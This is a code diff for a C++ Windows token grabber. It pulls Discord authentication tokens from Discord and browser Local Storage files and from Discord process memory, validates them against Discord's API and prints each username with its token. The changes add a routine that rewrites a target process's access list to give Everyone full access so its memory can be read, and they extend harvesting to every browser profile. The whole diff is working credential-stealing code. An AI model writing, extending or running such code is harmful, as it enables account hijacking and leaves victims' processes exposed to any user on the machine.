@@ -10,11 +10,13 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <winhttp.h>
+#include <aclapi.h>
 #include <conio.h>
 #include <algorithm>
 
 #pragma comment(lib, "winhttp.lib")
-#pragma warning(disable: 4996)  // Suppress getenv warnings
+#pragma comment(lib, "advapi32.lib")
+#pragma warning(disable: 4996)  
 
 #define RST "\033[0m"
 #define RED "\033[31m"
@@ -31,14 +33,9 @@ void clscr() {
 
 namespace fs = std::filesystem;
 
-// Define readable page protection flags
-const std::set<DWORD> PAGE_READABLE = {PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READWRITE};
-
-// Regular expressions for token matching
+const std::set<DWORD> PAGE_READABLE = {PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY};
 const std::regex TOKEN_RE(R"([\w-]{24,26}\.[\w-]{6}\.[\w-]{25,38})");
 const std::regex MFA_RE(R"(mfa\.[\w-]{84})");
-
-// Discord API endpoint
 const std::wstring BASE = L"https://discord.com/api/v9";
 
 struct PBI_LITE {
@@ -58,9 +55,35 @@ struct UNI_STR {
 const char AUTH_ANCHOR[] = "Authorization";
 const char V8_ANCHOR[] = "\x6D\x00\x00\x00\x05token\x6D\x00\x00\x00\x03";
 
-// Classify a Discord process role from its command line (PEB walk via NtQueryInformationProcess)
-std::string classifyCmd(DWORD pid) {
+HANDLE openForRead(DWORD pid) {
     HANDLE h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (h) return h;
+
+    h = OpenProcess(WRITE_DAC, FALSE, pid);
+    if (!h) return nullptr;
+
+    PSID everyone = nullptr;
+    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
+    if (AllocateAndInitializeSid(&worldAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &everyone)) {
+        const DWORD ACL_LEN = 256;
+        PACL pDacl = (PACL)LocalAlloc(LPTR, ACL_LEN);
+        if (pDacl) {
+            if (InitializeAcl(pDacl, ACL_LEN, ACL_REVISION)
+                && AddAccessAllowedAce(pDacl, ACL_REVISION, PROCESS_ALL_ACCESS, everyone)) {
+                SetSecurityInfo(h, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
+                                nullptr, nullptr, pDacl, nullptr);
+            }
+            LocalFree(pDacl);
+        }
+        FreeSid(everyone);
+    }
+    CloseHandle(h);
+
+    return OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+}
+
+std::string classifyCmd(DWORD pid) {
+    HANDLE h = openForRead(pid);
     if (!h) return "unknown";
 
     typedef LONG(NTAPI* pNtQIP)(HANDLE, ULONG, PULONG, ULONG, PULONG);
@@ -120,7 +143,6 @@ void grabFromWindow(const std::string& window, std::set<std::string>& out) {
         out.insert(*it);
 }
 
-// Fast path: only decode/scan buffers that contain known token containers
 bool scanProcessFast(HANDLE h, std::set<std::string>& out) {
     bool any = false;
     MEMORY_BASIC_INFORMATION mbi;
@@ -154,7 +176,6 @@ bool scanProcessFast(HANDLE h, std::set<std::string>& out) {
     return any;
 }
 
-// Fallback: full-heap regex scan across every readable region
 void scanProcessFull(HANDLE h, const std::string& exeName, DWORD pid, std::set<std::string>& out) {
     MEMORY_BASIC_INFORMATION mbi;
     LPCVOID address = 0;
@@ -180,7 +201,6 @@ void scanProcessFull(HANDLE h, const std::string& exeName, DWORD pid, std::set<s
     std::cout << YLW "    " << exeName << " pid " << pid << " heap size " << total << " bytes" RST << std::endl;
 }
 
-// Function to test if a token is valid using WinHTTP
 bool testToken(const std::string& token) {
     std::wstring url = BASE + L"/users/@me";
     std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
@@ -235,7 +255,6 @@ bool testToken(const std::string& token) {
     return statusCode == 200;
 }
 
-// Function to extract tokens from a file
 void extractTokensFromFile(const fs::path& filePath, std::set<std::string>& candidates) {
     std::ifstream file(filePath, std::ios::binary);
     if (!file.is_open()) return;
@@ -253,29 +272,28 @@ void extractTokensFromFile(const fs::path& filePath, std::set<std::string>& cand
     }
 }
 
-// Function to scan Discord processes for tokens
 void scanDiscordProcesses(std::set<std::string>& mem_candidates) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return;
     
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     
     std::vector<DWORD> discordPids;
     std::vector<std::tuple<DWORD, std::string, std::string>> bearing;
     
-    if (Process32First(snapshot, &pe32)) {
+    if (Process32FirstW(snapshot, &pe32)) {
         do {
-            std::string exeName = pe32.szExeFile;
+            std::string exeName = fs::path(pe32.szExeFile).string();
             std::string exeLower = exeName;
             std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), [](unsigned char c){ return std::tolower(c); });
             
-            if (exeLower == "discord.exe" || exeLower == "discordptb.exe" || exeLower == "discordcanary.exe") {
+            if (exeLower.rfind("discord", 0) == 0) {
                 discordPids.push_back(pe32.th32ProcessID);
                 std::string kind = classifyCmd(pe32.th32ProcessID);
                 if (tokenBearing(kind)) bearing.push_back({pe32.th32ProcessID, exeName, kind});
             }
-        } while (Process32Next(snapshot, &pe32));
+        } while (Process32NextW(snapshot, &pe32));
     }
     
     CloseHandle(snapshot);
@@ -293,21 +311,19 @@ void scanDiscordProcesses(std::set<std::string>& mem_candidates) {
         return;
     }
     
-    // Fast pass: only scan buffers containing known token containers (Authorization headers / V8 keys)
     std::cout << CYN "Scanning for authorization headers and V8 token keys..." RST << std::endl;
     bool foundFast = false;
     for (const auto& [pid, name, kind] : bearing) {
-        HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+        HANDLE hProcess = openForRead(pid);
         if (!hProcess) continue;
         foundFast |= scanProcessFast(hProcess, mem_candidates);
         CloseHandle(hProcess);
     }
     
-    // Fallback: full-heap scan only if the fast pass returned nothing
     if (!foundFast) {
         std::cout << YLW "Fast scan found nothing, falling back to full memory scan..." RST << std::endl;
         for (const auto& [pid, name, kind] : bearing) {
-            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+            HANDLE hProcess = openForRead(pid);
             if (!hProcess) continue;
             scanProcessFull(hProcess, name, pid, mem_candidates);
             CloseHandle(hProcess);
@@ -329,20 +345,42 @@ int main() {
     std::string local = localEnv ? localEnv : "";
     std::string roam = roamEnv ? roamEnv : "";
     
-    // Define paths to search
     std::map<std::string, std::string> paths = {
         {"Discord",        roam + "\\discord\\Local Storage\\leveldb"},
         {"Discord Canary", roam + "\\discordcanary\\Local Storage\\leveldb"},
-        {"Discord PTB",    roam + "\\discordptb\\Local Storage\\leveldb"},
-        {"Chrome",         local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"},
-        {"Edge",           local + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"},
-        {"Brave",          local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}
+        {"Discord PTB",    roam + "\\discordptb\\Local Storage\\leveldb"}
     };
+
+    auto addBrowserProfiles = [&](const std::string& browser, const std::string& userDataRoot) {
+        if (!fs::exists(userDataRoot)) {
+            std::cout << RED "  Path not found: " << userDataRoot
+                      << "\\Default\\Local Storage\\leveldb" RST << std::endl;
+            return;
+        }
+        try {
+            bool found = false;
+            for (const auto& entry : fs::directory_iterator(userDataRoot)) {
+                if (!entry.is_directory()) continue;
+                fs::path ldb = entry.path() / "Local Storage" / "leveldb";
+                if (fs::exists(ldb)) {
+                    paths[browser + " (" + entry.path().filename().string() + ")"] = ldb.string();
+                    found = true;
+                }
+            }
+            if (!found)
+                std::cout << RED "  No " << browser << " profile with token storage found" RST << std::endl;
+        } catch (...) {
+        }
+    };
+
+    addBrowserProfiles("Chrome", local + "\\Google\\Chrome\\User Data");
+    addBrowserProfiles("Edge",   local + "\\Microsoft\\Edge\\User Data");
+    addBrowserProfiles("Brave",  local + "\\BraveSoftware\\Brave-Browser\\User Data");
     
     std::set<std::string> candidates;
-    std::vector<std::pair<std::string, std::string>> validAccounts; // Store username-token pairs
+    std::vector<std::pair<std::string, std::string>> validAccounts;
+    std::set<std::string> seenIds; 
     
-    // First scan files for tokens using regex
     std::cout << CYN "Scanning local files for Discord tokens..." RST << std::endl;
     for (const auto& [name, path] : paths) {
         if (!fs::exists(path)) {
@@ -367,13 +405,11 @@ int main() {
         }
     }
     
-    // Validate tokens found by regex
     std::cout << "\n" CYNB "Validating tokens found in files..." RST << std::endl;
     int foundInFiles = 0;
     for (const auto& token : candidates) {
         try {
             if (testToken(token)) {
-                // Get user information from the API response
                 std::wstring url = BASE + L"/users/@me";
                 std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
                                       L"Content-Type: application/json\r\n" +
@@ -401,28 +437,36 @@ int main() {
                                     if (statusCode == 200) {
                                         DWORD dataSize = 0;
                                         
-                                        // Get the size of the response
                                         WinHttpQueryDataAvailable(hRequest, &dataSize);
                                         if (dataSize > 0) {
                                             std::vector<char> responseData(dataSize + 1);
                                             DWORD bytesRead = 0;
                                             
-                                            // Read the response data
                                             if (WinHttpReadData(hRequest, responseData.data(), dataSize, &bytesRead)) {
                                                 responseData[bytesRead] = '\0';
                                                 std::string response(responseData.data(), bytesRead);
                                                 
-                                                // Parse JSON response to extract username
                                                 size_t usernamePos = response.find("\"username\":\"");
                                                 if (usernamePos != std::string::npos) {
-                                                    usernamePos += 12; // Skip "username":"
+                                                    usernamePos += 12; 
                                                     size_t usernameEnd = response.find("\"", usernamePos);
                                                     if (usernameEnd != std::string::npos) {
-                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);
-                                                        
-                                                        validAccounts.push_back({username, token});
-                                                        foundInFiles++;
-                                                        std::cout << GRN "  Valid token found for user: " << username << RST << std::endl;
+                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);                                                        
+                                                        size_t idPos = response.find("\"id\":\"");
+                                                        bool dup = false;
+                                                        if (idPos != std::string::npos) {
+                                                            idPos += 6; 
+                                                            size_t idEnd = response.find("\"", idPos);
+                                                            if (idEnd != std::string::npos)
+                                                                dup = !seenIds.insert(response.substr(idPos, idEnd - idPos)).second;
+                                                        }
+                                                        if (dup) {
+                                                            std::cout << GRN "  Duplicate skipped: " << username << " (same account, different token)" RST << std::endl;
+                                                        } else {
+                                                            validAccounts.push_back({username, token});
+                                                            foundInFiles++;
+                                                            std::cout << GRN "  Valid token found for user: " << username << RST << std::endl;
+                                                        }
                                                     }
                                                 }
                                             }
@@ -438,7 +482,6 @@ int main() {
                 }
             }
         } catch (...) {
-            // Ignore exceptions for invalid tokens
         }
     }
     
@@ -446,7 +489,6 @@ int main() {
         std::cout << RED "No Valid Accounts Found Using Regex" RST << std::endl;
     }
     
-    // Scan Discord processes for tokens
     std::cout << "\n" CYNB "Scanning process memory for additional tokens..." RST << std::endl;
     std::set<std::string> mem_candidates;
     try {
@@ -455,11 +497,9 @@ int main() {
         std::cerr << RED "Memory scan failed: " << e.what() << RST << std::endl;
     }
     
-    // Validate tokens found in memory
     std::cout << CYNB "Validating tokens found in memory..." RST << std::endl;
     int foundInMemory = 0;
     for (const auto& token : mem_candidates) {
-        // Check if this token was already found in files
         bool alreadyFound = false;
         for (const auto& [username, existingToken] : validAccounts) {
             if (token == existingToken) {
@@ -469,12 +509,11 @@ int main() {
         }
         
         if (alreadyFound) {
-            continue; // Skip tokens we already have
+            continue; 
         }
         
         try {
             if (testToken(token)) {
-                // Get user information from the API response
                 std::wstring url = BASE + L"/users/@me";
                 std::wstring headers = L"Authorization: " + std::wstring(token.begin(), token.end()) + L"\r\n" +
                                       L"Content-Type: application/json\r\n" +
@@ -502,28 +541,36 @@ int main() {
                                     if (statusCode == 200) {
                                         DWORD dataSize = 0;
                                         
-                                        // Get the size of the response
                                         WinHttpQueryDataAvailable(hRequest, &dataSize);
                                         if (dataSize > 0) {
                                             std::vector<char> responseData(dataSize + 1);
                                             DWORD bytesRead = 0;
                                             
-                                            // Read the response data
                                             if (WinHttpReadData(hRequest, responseData.data(), dataSize, &bytesRead)) {
                                                 responseData[bytesRead] = '\0';
                                                 std::string response(responseData.data(), bytesRead);
                                                 
-                                                // Parse JSON response to extract username
                                                 size_t usernamePos = response.find("\"username\":\"");
                                                 if (usernamePos != std::string::npos) {
-                                                    usernamePos += 12; // Skip "username":"
+                                                    usernamePos += 12; 
                                                     size_t usernameEnd = response.find("\"", usernamePos);
                                                     if (usernameEnd != std::string::npos) {
-                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);
-                                                        
-                                                        validAccounts.push_back({username, token});
-                                                        foundInMemory++;
-                                                        std::cout << GRN "  New valid token found in memory for user: " << username << RST << std::endl;
+                                                        std::string username = response.substr(usernamePos, usernameEnd - usernamePos);                                                        
+                                                        size_t idPos = response.find("\"id\":\"");
+                                                        bool dup = false;
+                                                        if (idPos != std::string::npos) {
+                                                            idPos += 6; 
+                                                            size_t idEnd = response.find("\"", idPos);
+                                                            if (idEnd != std::string::npos)
+                                                                dup = !seenIds.insert(response.substr(idPos, idEnd - idPos)).second;
+                                                        }
+                                                        if (dup) {
+                                                            std::cout << GRN "  Duplicate skipped: " << username << " (same account, different token)" RST << std::endl;
+                                                        } else {
+                                                            validAccounts.push_back({username, token});
+                                                            foundInMemory++;
+                                                            std::cout << GRN "  New valid token found in memory for user: " << username << RST << std::endl;
+                                                        }
                                                     }
                                                 }
                                             }
@@ -539,7 +586,6 @@ int main() {
                 }
             }
         } catch (...) {
-            // Ignore exceptions for invalid tokens
         }
     }
     
@@ -547,7 +593,6 @@ int main() {
         std::cout << RED "No other accounts found using memory scan" RST << std::endl;
     }
     
-    // Final output
     std::cout << "\n" CYNB "Following Discord Accounts Were Found:" RST << std::endl;
     for (const auto& [username, token] : validAccounts) {
         std::cout << YLW "Username          :   " RST << username << std::endl;
